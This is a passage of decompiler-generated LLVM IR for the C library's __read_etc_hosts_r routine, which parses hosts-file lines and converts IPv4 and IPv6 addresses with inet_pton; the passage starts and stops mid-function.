  uselistorder label %dec_label_pc_10016d94, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg7, i32* %r9.global-to-local, align 4
  store i32 %arg6, i32* @r8, align 4
  %tmp = ptrtoint i32* %arg5 to i32
  %v0_10016da8 = load i32, i32* @lr, align 4
  store i32 %arg6, i32* @r30, align 4
  %v1_10016dbc = sub i32 0, %arg6
  %v1_10016dc0 = urem i32 %v1_10016dbc, 4
  store i32 %v1_10016dc0, i32* %r0.global-to-local, align 4
  %v3_10016dc0 = icmp eq i32 %v1_10016dc0, 0
  store i32 %arg1, i32* @r20, align 4
  store i32 %arg2, i32* %r15.global-to-local, align 4
  store i32 %arg3, i32* @r19, align 4
  store i32 %arg4, i32* @r18, align 4
  store i32 %tmp, i32* @r28, align 4
  %v0_10016dd8 = load i32, i32* @r10, align 4
  store i32 %v0_10016dd8, i32* @r17, align 4
  store i32 %arg8, i32* @r16, align 4
  %v0_10016df4.pr = load i32, i32* %r9.global-to-local, align 4
  br i1 %v3_10016dc0, label %dec_label_pc_10016df4, label %dec_label_pc_10016de4

dec_label_pc_10016de4:                            ; preds = %entry
  %v2_10016de4 = icmp ult i32 %v0_10016df4.pr, %v1_10016dc0
  br i1 %v2_10016de4, label %dec_label_pc_100170a8, label %dec_label_pc_10016dec

dec_label_pc_10016dec:                            ; preds = %dec_label_pc_10016de4
  %v2_10016dec = sub i32 %v0_10016df4.pr, %v1_10016dc0
  store i32 %v2_10016dec, i32* %r9.global-to-local, align 4
  %v2_10016df0 = add i32 %v1_10016dc0, %arg6
  store i32 %v2_10016df0, i32* @r30, align 4
  br label %dec_label_pc_10016df4

dec_label_pc_10016df4:                            ; preds = %entry, %dec_label_pc_10016dec
  %v0_10016e00 = phi i32 [ %v2_10016df0, %dec_label_pc_10016dec ], [ %arg6, %entry ]
  %v0_10016e04 = phi i32 [ %v2_10016dec, %dec_label_pc_10016dec ], [ %v0_10016df4.pr, %entry ]
  %tmp49 = icmp ult i32 %v0_10016e04, 32
  br i1 %tmp49, label %dec_label_pc_100170a8, label %dec_label_pc_10016dfc

dec_label_pc_10016dfc:                            ; preds = %dec_label_pc_10016df4
  %v3_10016dfc = icmp eq i32 %arg4, 1
  %v1_10016e00 = add i32 %v0_10016e00, 32
  store i32 %v1_10016e00, i32* @r24, align 4
  %v1_10016e04 = add i32 %v0_10016e04, -32
  store i32 %v1_10016e04, i32* @r27, align 4
  br i1 %v3_10016dfc, label %dec_label_pc_10016f04, label %dec_label_pc_10016e0c

dec_label_pc_10016e0c:                            ; preds = %dec_label_pc_10016dfc
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10016e14 = inttoptr i32 %arg8 to i32*
  store i32 -1, i32* %v2_10016e14, align 4
  %tmp50 = icmp ult i32 %v1_10016e04, 4
  br i1 %tmp50, label %dec_label_pc_100170a8, label %dec_label_pc_10016e1c

dec_label_pc_10016e1c:                            ; preds = %dec_label_pc_10016e0c
  %v0_10016e1c = load i32, i32* %r9.global-to-local, align 4
  %v1_10016e1c = add i32 %v0_10016e1c, -36
  store i32 %v1_10016e1c, i32* %r0.global-to-local, align 4
  %tmp51 = icmp ult i32 %v1_10016e1c, 8
  br i1 %tmp51, label %dec_label_pc_100170a8, label %dec_label_pc_10016e28

dec_label_pc_10016e28:                            ; preds = %dec_label_pc_10016e1c
  %v0_10016e28 = load i32, i32* @r27, align 4
  %tmp52 = icmp ult i32 %v0_10016e28, 16
  br i1 %tmp52, label %dec_label_pc_100170a8, label %dec_label_pc_10016e30

dec_label_pc_10016e30:                            ; preds = %dec_label_pc_10016e28
  %v1_10016e30 = add i32 %v0_10016e1c, -48
  store i32 %v1_10016e30, i32* %r0.global-to-local, align 4
  %tmp53 = icmp ult i32 %v1_10016e30, 8
  br i1 %tmp53, label %dec_label_pc_100170a8, label %dec_label_pc_10016e3c

dec_label_pc_10016e3c:                            ; preds = %dec_label_pc_10016e30
  %v1_10016e3c = add i32 %v0_10016e1c, -56
  store i32 %v1_10016e3c, i32* %r0.global-to-local, align 4
  %v1_10016e40 = add i32 %v0_10016e1c, -44
  store i32 %v1_10016e40, i32* @r27, align 4
  %v3_10016e44 = icmp ugt i32 %v1_10016e3c, %v1_10016e40
  %v0_10016e48 = load i32, i32* @r30, align 4
  %v1_10016e48 = add i32 %v0_10016e48, 36
  store i32 %v1_10016e48, i32* @r29, align 4
  %v1_10016e4c = add i32 %v0_10016e48, 48
  store i32 %v1_10016e4c, i32* @r26, align 4
  br i1 %v3_10016e44, label %dec_label_pc_10016e60, label %dec_label_pc_10016e58

dec_label_pc_10016e58:                            ; preds = %dec_label_pc_10016e3c
  store i32 %v1_10016e3c, i32* @r27, align 4
  br label %dec_label_pc_10016e60

dec_label_pc_10016e60:                            ; preds = %dec_label_pc_10016e3c, %dec_label_pc_10016e58
  %v0_10016e60 = phi i32 [ %v1_10016e3c, %dec_label_pc_10016e58 ], [ %v1_10016e40, %dec_label_pc_10016e3c ]
  %tmp54 = icmp ult i32 %v0_10016e60, 80
  br i1 %tmp54, label %dec_label_pc_100170a8, label %dec_label_pc_10016e68

dec_label_pc_10016e68:                            ; preds = %dec_label_pc_10016e60
  store i32 268529260, i32* @lr, align 4
  %v0_10016e68 = call i32 @__open_etc_hosts()
  store i32 %v0_10016e68, i32* @r20, align 4
  %v3_10016e6c = icmp eq i32 %v0_10016e68, 0
  br i1 %v3_10016e6c, label %dec_label_pc_10016e8c, label %dec_label_pc_10016e74

dec_label_pc_10016e74:                            ; preds = %dec_label_pc_10016e68
  %v0_10016e74 = load i32, i32* @r24, align 4
  store i32 %v0_10016e74, i32* @r25, align 4
  %v0_10016e78 = load i32, i32* @r29, align 4
  store i32 %v0_10016e78, i32* @r22, align 4
  %v0_10016e7c = load i32, i32* @r26, align 4
  store i32 %v0_10016e7c, i32* @r23, align 4
  %v0_10016e80 = load i32, i32* @r31, align 4
  store i32 %v0_10016e80, i32* @r24, align 4
  store i32 %v0_10016e74, i32* @r21, align 4
  %v1_10016f1c.pre = load i32, i32* @r16, align 4
  br label %dec_label_pc_10016f14

dec_label_pc_10016e8c:                            ; preds = %dec_label_pc_10016e68
  %v1_10016e8c = load i32, i32* @r17, align 4
  %v2_10016e8c = inttoptr i32 %v1_10016e8c to i32*
  store i32 0, i32* %v2_10016e8c, align 4
  %v0_10016e90 = call i32 @__errno_location()
  %v1_10016e94 = inttoptr i32 %v0_10016e90 to i32*
  %v2_10016e94 = load i32, i32* %v1_10016e94, align 4
  store i32 %v2_10016e94, i32* @r26, align 4
  br label %dec_label_pc_100170ac

dec_label_pc_10016e9c:                            ; preds = %dec_label_pc_1001703c
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10016ea0 = load i32, i32* @r25, align 4
  %v1_10016ea0 = load i32, i32* @r22, align 4
  %v2_10016ea0 = inttoptr i32 %v1_10016ea0 to i32*
  store i32 %v0_10016ea0, i32* %v2_10016ea0, align 4
  %v0_10016ea4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10016ea4 = load i32, i32* @r22, align 4
  %v2_10016ea4 = add i32 %v1_10016ea4, 4
  %v3_10016ea4 = inttoptr i32 %v2_10016ea4 to i32*
  store i32 %v0_10016ea4, i32* %v3_10016ea4, align 4
  %v0_10016ea8 = load i32, i32* @r30, align 4
  %v1_10016ea8 = add i32 %v0_10016ea8, 8
  store i32 %v1_10016ea8, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_10016eb0 = add i32 %v0_10016ea8, 4
  %v2_10016eb0 = inttoptr i32 %v1_10016eb0 to i32*
  %v3_10016eb0 = load i32, i32* %v2_10016eb0, align 4
  store i32 %v3_10016eb0, i32* %r0.global-to-local, align 4
  %v0_10016eb4 = load i32, i32* @r19, align 4
  %v1_10016eb4 = load i32, i32* @r28, align 4
  %v2_10016eb4 = add i32 %v1_10016eb4, 8
  %v3_10016eb4 = inttoptr i32 %v2_10016eb4 to i32*
  store i32 %v0_10016eb4, i32* %v3_10016eb4, align 4
  %v0_10016eb8 = load i32, i32* %r0.global-to-local, align 4
  %v1_10016eb8 = load i32, i32* @r28, align 4
  %v2_10016eb8 = inttoptr i32 %v1_10016eb8 to i32*
  store i32 %v0_10016eb8, i32* %v2_10016eb8, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_10016ec0 = load i32, i32* @r28, align 4
  %v2_10016ec0 = add i32 %v1_10016ec0, 12
  %v3_10016ec0 = inttoptr i32 %v2_10016ec0 to i32*
  store i32 4, i32* %v3_10016ec0, align 4
  %v0_10016ec4 = load i32, i32* @r22, align 4
  %v1_10016ec4 = load i32, i32* @r28, align 4
  %v2_10016ec4 = add i32 %v1_10016ec4, 16
  %v3_10016ec4 = inttoptr i32 %v2_10016ec4 to i32*
  store i32 %v0_10016ec4, i32* %v3_10016ec4, align 4
  br label %dec_label_pc_10016ef8

dec_label_pc_10016ecc:                            ; preds = %dec_label_pc_10017060
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10016ed0 = load i32, i32* @r21, align 4
  %v1_10016ed0 = load i32, i32* @r23, align 4
  %v2_10016ed0 = inttoptr i32 %v1_10016ed0 to i32*
  store i32 %v0_10016ed0, i32* %v2_10016ed0, align 4
  %v0_10016ed4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10016ed4 = load i32, i32* @r23, align 4
  %v2_10016ed4 = add i32 %v1_10016ed4, 4
  %v3_10016ed4 = inttoptr i32 %v2_10016ed4 to i32*
  store i32 %v0_10016ed4, i32* %v3_10016ed4, align 4
  %v0_10016ed8 = load i32, i32* @r30, align 4
  %v1_10016ed8 = add i32 %v0_10016ed8, 8
  store i32 %v1_10016ed8, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_10016ee0 = add i32 %v0_10016ed8, 4
  %v2_10016ee0 = inttoptr i32 %v1_10016ee0 to i32*
  %v3_10016ee0 = load i32, i32* %v2_10016ee0, align 4
  store i32 %v3_10016ee0, i32* %r0.global-to-local, align 4
  %v0_10016ee4 = load i32, i32* @r19, align 4
  %v1_10016ee4 = load i32, i32* @r28, align 4
  %v2_10016ee4 = add i32 %v1_10016ee4, 8
  %v3_10016ee4 = inttoptr i32 %v2_10016ee4 to i32*
  store i32 %v0_10016ee4, i32* %v3_10016ee4, align 4
  %v0_10016ee8 = load i32, i32* %r0.global-to-local, align 4
  %v1_10016ee8 = load i32, i32* @r28, align 4
  %v2_10016ee8 = inttoptr i32 %v1_10016ee8 to i32*
  store i32 %v0_10016ee8, i32* %v2_10016ee8, align 4
  store i32 16, i32* %r0.global-to-local, align 4
  %v1_10016ef0 = load i32, i32* @r28, align 4
  %v2_10016ef0 = add i32 %v1_10016ef0, 12
  %v3_10016ef0 = inttoptr i32 %v2_10016ef0 to i32*
  store i32 16, i32* %v3_10016ef0, align 4
  %v0_10016ef4 = load i32, i32* @r23, align 4
  %v1_10016ef4 = load i32, i32* @r28, align 4
  %v2_10016ef4 = add i32 %v1_10016ef4, 16
  %v3_10016ef4 = inttoptr i32 %v2_10016ef4 to i32*
  store i32 %v0_10016ef4, i32* %v3_10016ef4, align 4
  br label %dec_label_pc_10016ef8

dec_label_pc_10016ef8:                            ; preds = %dec_label_pc_10016e9c, %dec_label_pc_10016ecc
  %v0_10016ef8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10016ef8 = load i32, i32* @r28, align 4
  %v2_10016ef8 = add i32 %v1_10016ef8, 4
  %v3_10016ef8 = inttoptr i32 %v2_10016ef8 to i32*
  store i32 %v0_10016ef8, i32* %v3_10016ef8, align 4
  %v0_10016efc = load i32, i32* @r28, align 4
  %v1_10016efc = load i32, i32* @r17, align 4
  %v2_10016efc = inttoptr i32 %v1_10016efc to i32*
  store i32 %v0_10016efc, i32* %v2_10016efc, align 4
  br label %dec_label_pc_10017094

dec_label_pc_10016f04:                            ; preds = %dec_label_pc_10016dfc
  store i32 0, i32* @r25, align 4
  store i32 0, i32* @r22, align 4
  store i32 0, i32* @r21, align 4
  store i32 0, i32* @r23, align 4
  br label %dec_label_pc_10016f14

dec_label_pc_10016f14:                            ; preds = %dec_label_pc_10016e74, %dec_label_pc_10016f04
  %v1_10016f1c = phi i32 [ %v1_10016f1c.pre, %dec_label_pc_10016e74 ], [ %arg8, %dec_label_pc_10016f04 ]
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r26, align 4
  %v2_10016f1c = inttoptr i32 %v1_10016f1c to i32*
  store i32 1, i32* %v2_10016f1c, align 4
  br label %dec_label_pc_1001707c

dec_label_pc_10016f24:                            ; preds = %dec_label_pc_1001707c
  %v0_10016f24 = load i32, i32* @r24, align 4
  store i32 %v0_10016f24, i32* @r3, align 4
  store i32 268529456, i32* @lr, align 4
  %v2_10016f2c = call i32 @__GI_strchr(i32 %v0_10016f24, i32 35)
  %v4_10016f30 = icmp eq i32 %v2_10016f2c, 0
  br i1 %v4_10016f30, label %dec_label_pc_10016f40, label %dec_label_pc_10016f38

dec_label_pc_10016f38:                            ; preds = %dec_label_pc_10016f24
  %v3_10016f2c = inttoptr i32 %v2_10016f2c to i8*
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %v3_10016f2c, align 1
  br label %dec_label_pc_10016f40

dec_label_pc_10016f40:                            ; preds = %dec_label_pc_10016f24, %dec_label_pc_10016f38
  %v0_10016f40 = load i32, i32* @r24, align 4
  store i32 %v0_10016f40, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  %v1_10016fbc17 = inttoptr i32 %v0_10016f40 to i8*
  %v2_10016fbc18 = load i8, i8* %v1_10016fbc17, align 1
  %v3_10016fbc19 = zext i8 %v2_10016fbc18 to i32
  store i32 %v3_10016fbc19, i32* %r0.global-to-local, align 4
  %v3_10016fc021 = icmp eq i8 %v2_10016fbc18, 0
  br i1 %v3_10016fc021, label %dec_label_pc_10016fc8, label %dec_label_pc_10016f58.preheader

dec_label_pc_10016f4c:                            ; preds = %dec_label_pc_10016f68
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10016f50 = inttoptr i32 %v0_10016f8c to i8*
  store i8 0, i8* %v3_10016f50, align 1
  %v0_10016f54 = load i32, i32* %r11.global-to-local, align 4
  %v1_10016f54 = add i32 %v0_10016f54, 1
  store i32 %v1_10016f54, i32* %r11.global-to-local, align 4
  %v1_10016f58 = inttoptr i32 %v1_10016f54 to i8*
  %v2_10016f58 = load i8, i8* %v1_10016f58, align 1
  %v3_10016f58 = zext i8 %v2_10016f58 to i32
  store i32 %v3_10016f58, i32* %r0.global-to-local, align 4
  %v3_10016f5c = icmp eq i8 %v2_10016f58, 0
  %v1_10016f60 = mul nuw nsw i32 %v3_10016f58, 2
  store i32 %v1_10016f60, i32* @r10, align 4
  br i1 %v3_10016f5c, label %dec_label_pc_10016fc8, label %dec_label_pc_10016f68

dec_label_pc_10016f68:                            ; preds = %dec_label_pc_10016f58.preheader, %dec_label_pc_10016f4c
  %v0_10016f8c = phi i32 [ %v1_10016f54, %dec_label_pc_10016f4c ], [ %v0_10016f582, %dec_label_pc_10016f58.preheader ]
  %v0_10016f70 = phi i32 [ %v1_10016f60, %dec_label_pc_10016f4c ], [ %v1_10016f608, %dec_label_pc_10016f58.preheader ]
  %v3_10016f6c = load i32, i32* @global_var_1002efac, align 4
  store i32 %v3_10016f6c, i32* %r9.global-to-local, align 4
  %v2_10016f70 = add i32 %v3_10016f6c, %v0_10016f70
  %v3_10016f70 = inttoptr i32 %v2_10016f70 to i16*
  %v4_10016f70 = load i16, i16* %v3_10016f70, align 2
  %v5_10016f70 = zext i16 %v4_10016f70 to i32
  store i32 %v5_10016f70, i32* %r0.global-to-local, align 4
  %v1_10016f74 = and i32 %v5_10016f70, 32
  store i32 %v1_10016f74, i32* %r9.global-to-local, align 4
  %v3_10016f74 = icmp eq i32 %v1_10016f74, 0
  br i1 %v3_10016f74, label %dec_label_pc_10016f7c, label %dec_label_pc_10016f4c

dec_label_pc_10016f7c:                            ; preds = %dec_label_pc_10016f68
  %v0_10016f7c = load i32, i32* @r29, align 4
  %v2_10016f7c = icmp sgt i32 %v0_10016f7c, 6
  br i1 %v2_10016f7c, label %dec_label_pc_10016f98.preheader, label %dec_label_pc_10016f84

dec_label_pc_10016f84:                            ; preds = %dec_label_pc_10016f7c
  %v1_10016f84 = mul i32 %v0_10016f7c, 4
  store i32 %v1_10016f84, i32* %r0.global-to-local, align 4
  %v1_10016f88 = add i32 %v0_10016f7c, 1
  store i32 %v1_10016f88, i32* @r29, align 4
  %v1_10016f8c = load i32, i32* @r30, align 4
  %v3_10016f8c = add i32 %v1_10016f8c, %v1_10016f84
  %v4_10016f8c = inttoptr i32 %v3_10016f8c to i32*
  store i32 %v0_10016f8c, i32* %v4_10016f8c, align 4
  %v0_10016f989.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10016f98.preheader

dec_label_pc_10016f98.preheader:                  ; preds = %dec_label_pc_10016f84, %dec_label_pc_10016f7c
  %v0_10016f989 = phi i32 [ %v0_10016f989.pre, %dec_label_pc_10016f84 ], [ %v0_10016f8c, %dec_label_pc_10016f7c ]
  %v1_10016f9810 = inttoptr i32 %v0_10016f989 to i8*
  %v2_10016f9811 = load i8, i8* %v1_10016f9810, align 1
  %v3_10016f9812 = zext i8 %v2_10016f9811 to i32
  store i32 %v3_10016f9812, i32* %r0.global-to-local, align 4
  %v3_10016f9c14 = icmp eq i8 %v2_10016f9811, 0
  %v1_10016fa015 = mul nuw nsw i32 %v3_10016f9812, 2
  store i32 %v1_10016fa015, i32* @r10, align 4
  br i1 %v3_10016f9c14, label %dec_label_pc_10016fbc.loopexit, label %dec_label_pc_10016fa8.lr.ph

dec_label_pc_10016fa8.lr.ph:                      ; preds = %dec_label_pc_10016f98.preheader
  %v3_10016fac.pre = load i32, i32* @global_var_1002efac, align 4
  br label %dec_label_pc_10016fa8

dec_label_pc_10016f94:                            ; preds = %dec_label_pc_10016fa8
  %v1_10016f94 = add i32 %v0_10016f94, 1
  store i32 %v1_10016f94, i32* %r11.global-to-local, align 4
  %v1_10016f98 = inttoptr i32 %v1_10016f94 to i8*
  %v2_10016f98 = load i8, i8* %v1_10016f98, align 1
  %v3_10016f98 = zext i8 %v2_10016f98 to i32
  store i32 %v3_10016f98, i32* %r0.global-to-local, align 4
  %v3_10016f9c = icmp eq i8 %v2_10016f98, 0
  %v1_10016fa0 = mul nuw nsw i32 %v3_10016f98, 2
  store i32 %v1_10016fa0, i32* @r10, align 4
  br i1 %v3_10016f9c, label %dec_label_pc_10016fbc.loopexit, label %dec_label_pc_10016fa8

dec_label_pc_10016fa8:                            ; preds = %dec_label_pc_10016fa8.lr.ph, %dec_label_pc_10016f94
  %v0_10016f94 = phi i32 [ %v0_10016f989, %dec_label_pc_10016fa8.lr.ph ], [ %v1_10016f94, %dec_label_pc_10016f94 ]
  %v0_10016fb0 = phi i32 [ %v1_10016fa015, %dec_label_pc_10016fa8.lr.ph ], [ %v1_10016fa0, %dec_label_pc_10016f94 ]
  store i32 %v3_10016fac.pre, i32* %r9.global-to-local, align 4
  %v2_10016fb0 = add i32 %v0_10016fb0, %v3_10016fac.pre
  %v3_10016fb0 = inttoptr i32 %v2_10016fb0 to i16*
  %v4_10016fb0 = load i16, i16* %v3_10016fb0, align 2
  %v5_10016fb0 = zext i16 %v4_10016fb0 to i32
  store i32 %v5_10016fb0, i32* %r0.global-to-local, align 4
  %v1_10016fb4 = and i32 %v5_10016fb0, 32
  store i32 %v1_10016fb4, i32* %r9.global-to-local, align 4
  %v3_10016fb4 = icmp eq i32 %v1_10016fb4, 0
  br i1 %v3_10016fb4, label %dec_label_pc_10016f94, label %dec_label_pc_10016fbc.loopexit

dec_label_pc_10016fbc.loopexit:                   ; preds = %dec_label_pc_10016fa8, %dec_label_pc_10016f94, %dec_label_pc_10016f98.preheader
  %v0_10016fbc = phi i32 [ %v0_10016f989, %dec_label_pc_10016f98.preheader ], [ %v0_10016f94, %dec_label_pc_10016fa8 ], [ %v1_10016f94, %dec_label_pc_10016f94 ]
  %v1_10016fbc = inttoptr i32 %v0_10016fbc to i8*
  %v2_10016fbc = load i8, i8* %v1_10016fbc, align 1
  %v3_10016fbc = zext i8 %v2_10016fbc to i32
  store i32 %v3_10016fbc, i32* %r0.global-to-local, align 4
  %v3_10016fc0 = icmp eq i8 %v2_10016fbc, 0
  br i1 %v3_10016fc0, label %dec_label_pc_10016fc8, label %dec_label_pc_10016f58.preheader

dec_label_pc_10016f58.preheader:                  ; preds = %dec_label_pc_10016f40, %dec_label_pc_10016fbc.loopexit
  %v0_10016f582 = phi i32 [ %v0_10016fbc, %dec_label_pc_10016fbc.loopexit ], [ %v0_10016f40, %dec_label_pc_10016f40 ]
  %v1_10016f583 = inttoptr i32 %v0_10016f582 to i8*
  %v2_10016f584 = load i8, i8* %v1_10016f583, align 1
  %v3_10016f585 = zext i8 %v2_10016f584 to i32
  store i32 %v3_10016f585, i32* %r0.global-to-local, align 4
  %v3_10016f5c7 = icmp eq i8 %v2_10016f584, 0
  %v1_10016f608 = mul nuw nsw i32 %v3_10016f585, 2
  store i32 %v1_10016f608, i32* @r10, align 4
  br i1 %v3_10016f5c7, label %dec_label_pc_10016fc8, label %dec_label_pc_10016f68

dec_label_pc_10016fc8:                            ; preds = %dec_label_pc_10016fbc.loopexit, %dec_label_pc_10016f58.preheader, %dec_label_pc_10016f4c, %dec_label_pc_10016f40
  %v0_10016fc8 = load i32, i32* @r29, align 4
  %v1_10016fcc = mul i32 %v0_10016fc8, 4
  store i32 %v1_10016fcc, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10016fd4 = load i32, i32* @r30, align 4
  %v3_10016fd4 = add i32 %v2_10016fd4, %v1_10016fcc
  %v4_10016fd4 = inttoptr i32 %v3_10016fd4 to i32*
  store i32 0, i32* %v4_10016fd4, align 4
  %tmp55 = icmp slt i32 %v0_10016fc8, 2
  br i1 %tmp55, label %dec_label_pc_1001707c, label %dec_label_pc_10016fdc

dec_label_pc_10016fdc:                            ; preds = %dec_label_pc_10016fc8
  %v0_10016fdc = load i32, i32* @r18, align 4
  %v3_10016fdc = icmp eq i32 %v0_10016fdc, 1
  br i1 %v3_10016fdc, label %dec_label_pc_10017094, label %dec_label_pc_10016fe4

dec_label_pc_10016fe4:                            ; preds = %dec_label_pc_10016fdc
  %v3_10016fe4 = icmp eq i32 %v0_10016fdc, 2
  store i32 1, i32* @r31, align 4
  br i1 %v3_10016fe4, label %dec_label_pc_10016ff0, label %dec_label_pc_1001701c.preheader

dec_label_pc_1001701c.preheader:                  ; preds = %dec_label_pc_10016fe4
  %v1_1001701c23 = load i32, i32* @r29, align 4
  %v2_1001701c24 = icmp sgt i32 %v1_1001701c23, 1
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_1001702429 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_1001702429, i32* @r3, align 4
  br i1 %v2_1001701c24, label %dec_label_pc_10017008, label %dec_label_pc_1001702c

dec_label_pc_10016ff0:                            ; preds = %dec_label_pc_10016fe4
  %v0_10016ff0 = load i32, i32* @r30, align 4
  %v1_10016ff0 = inttoptr i32 %v0_10016ff0 to i32*
  %v2_10016ff0 = load i32, i32* %v1_10016ff0, align 4
  store i32 %v2_10016ff0, i32* @r4, align 4
  %v0_10016ff4 = load i32, i32* %r15.global-to-local, align 4
  %v2_10016ff8 = inttoptr i32 %v0_10016ff4 to i8*
  %v3_10016ff8 = call i32 @__GI_strcoll(i8* %v2_10016ff8, i32 %v2_10016ff0)
  %v3_10016ffc = icmp eq i32 %v3_10016ff8, 0
  br i1 %v3_10016ffc, label %dec_label_pc_10017034, label %dec_label_pc_1001707c

dec_label_pc_10017008:                            ; preds = %dec_label_pc_1001701c.preheader, %dec_label_pc_10017018
  %v1_10017008 = phi i32 [ %v1_10017020, %dec_label_pc_10017018 ], [ 4, %dec_label_pc_1001701c.preheader ]
  %v0_1001702431 = phi i32 [ %v0_10017024, %dec_label_pc_10017018 ], [ %v0_1001702429, %dec_label_pc_1001701c.preheader ]
  %v0_10017008 = load i32, i32* @r30, align 4
  %v2_10017008 = add i32 %v0_10017008, %v1_10017008
  %v3_10017008 = inttoptr i32 %v2_10017008 to i32*
  %v4_10017008 = load i32, i32* %v3_10017008, align 4
  store i32 %v4_10017008, i32* @r4, align 4
  %v2_1001700c = call i32 @__GI_strcasecmp(i32 %v0_1001702431, i32 %v4_10017008)
  %v3_10017010 = icmp eq i32 %v2_1001700c, 0
  %v0_1001702c.pre = load i32, i32* @r31, align 4
  br i1 %v3_10017010, label %dec_label_pc_10017008.dec_label_pc_1001702c_crit_edge, label %dec_label_pc_10017018

dec_label_pc_10017018:                            ; preds = %dec_label_pc_10017008
  %v1_10017018 = add i32 %v0_1001702c.pre, 1
  store i32 %v1_10017018, i32* @r31, align 4
  %v1_1001701c = load i32, i32* @r29, align 4
  %v2_1001701c = icmp slt i32 %v1_10017018, %v1_1001701c
  %v1_10017020 = mul i32 %v1_10017018, 4
  store i32 %v1_10017020, i32* %r0.global-to-local, align 4
  %v0_10017024 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_10017024, i32* @r3, align 4
  br i1 %v2_1001701c, label %dec_label_pc_10017008, label %dec_label_pc_1001702c

dec_label_pc_10017008.dec_label_pc_1001702c_crit_edge: ; preds = %dec_label_pc_10017008
  %v1_1001702c.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1001702c

dec_label_pc_1001702c:                            ; preds = %dec_label_pc_10017018, %dec_label_pc_10017008.dec_label_pc_1001702c_crit_edge, %dec_label_pc_1001701c.preheader
  %v1_1001702c = phi i32 [ %v1_1001702c.pre, %dec_label_pc_10017008.dec_label_pc_1001702c_crit_edge ], [ %v1_1001701c23, %dec_label_pc_1001701c.preheader ], [ %v1_1001701c, %dec_label_pc_10017018 ]
  %v0_1001702c = phi i32 [ %v0_1001702c.pre, %dec_label_pc_10017008.dec_label_pc_1001702c_crit_edge ], [ 1, %dec_label_pc_1001701c.preheader ], [ %v1_10017018, %dec_label_pc_10017018 ]
  %v2_1001702c = icmp slt i32 %v0_1001702c, %v1_1001702c
  br i1 %v2_1001702c, label %dec_label_pc_10017034, label %dec_label_pc_1001707c

dec_label_pc_10017034:                            ; preds = %dec_label_pc_10016ff0, %dec_label_pc_1001702c
  %v0_10017034 = load i32, i32* @r19, align 4
  %v3_10017034 = icmp eq i32 %v0_10017034, 2
  br i1 %v3_10017034, label %dec_label_pc_1001703c, label %dec_label_pc_10017058

dec_label_pc_1001703c:                            ; preds = %dec_label_pc_10017034
  %v0_1001703c = load i32, i32* @r30, align 4
  %v1_1001703c = inttoptr i32 %v0_1001703c to i32*
  %v2_1001703c = load i32, i32* %v1_1001703c, align 4
  %v0_10017044 = load i32, i32* @r25, align 4
  store i32 268529740, i32* @lr, align 4
  %v3_10017048 = inttoptr i32 %v2_1001703c to i8*
  %v4_10017048 = call i32 @inet_pton(i32 2, i8* %v3_10017048, i32 %v0_10017044)
  %v2_1001704c = icmp sgt i32 %v4_10017048, 0
  br i1 %v2_1001704c, label %dec_label_pc_10016e9c, label %dec_label_pc_10017078

dec_label_pc_10017058:                            ; preds = %dec_label_pc_10017034
  %v3_10017058 = icmp eq i32 %v0_10017034, 10
  br i1 %v3_10017058, label %dec_label_pc_10017060, label %dec_label_pc_10017078

dec_label_pc_10017060:                            ; preds = %dec_label_pc_10017058
  %v0_10017060 = load i32, i32* @r30, align 4
  %v1_10017060 = inttoptr i32 %v0_10017060 to i32*
  %v2_10017060 = load i32, i32* %v1_10017060, align 4
  %v0_10017068 = load i32, i32* @r21, align 4
  store i32 268529776, i32* @lr, align 4
  %v3_1001706c = inttoptr i32 %v2_10017060 to i8*
  %v4_1001706c = call i32 @inet_pton(i32 10, i8* %v3_1001706c, i32 %v0_10017068)
  %v2_10017070 = icmp sgt i32 %v4_1001706c, 0
  br i1 %v2_10017070, label %dec_label_pc_10016ecc, label %dec_label_pc_10017078

dec_label_pc_10017078:                            ; preds = %dec_label_pc_1001703c, %dec_label_pc_10017058, %dec_label_pc_10017060
  store i32 2, i32* @r26, align 4
  br label %dec_label_pc_1001707c

dec_label_pc_1001707c:                            ; preds = %dec_label_pc_1001702c, %dec_label_pc_10016ff0, %dec_label_pc_10016fc8, %dec_label_pc_10017078, %dec_label_pc_10016f14
  %v0_1001707c = load i32, i32* @r24, align 4
  %v0_10017080 = load i32, i32* @r27, align 4
  %v0_10017084 = load i32, i32* @r20, align 4
  store i32 268529804, i32* @lr, align 4
  %v3_10017088 = call i32 @fgets(i32 %v0_1001707c, i32 %v0_10017080, i32 %v0_10017084)
  %v3_1001708c = icmp eq i32 %v3_10017088, 0
  br i1 %v3_1001708c, label %dec_label_pc_10017094, label %dec_label_pc_10016f24

dec_label_pc_10017094:                            ; preds = %dec_label_pc_1001707c, %dec_label_pc_10016fdc, %dec_label_pc_10016ef8
  %v0_10017094 = load i32, i32* @r18, align 4
  %v3_10017094 = icmp eq i32 %v0_10017094, 1
  br i1 %v3_10017094, label %dec_label_pc_100170ac, label %dec_label_pc_1001709c

dec_label_pc_1001709c:                            ; preds = %dec_label_pc_10017094
  %v0_1001709c = load i32, i32* @r20, align 4
  store i32 ptrtoint (i32* @global_var_100170a4.616 to i32), i32* @lr, align 4
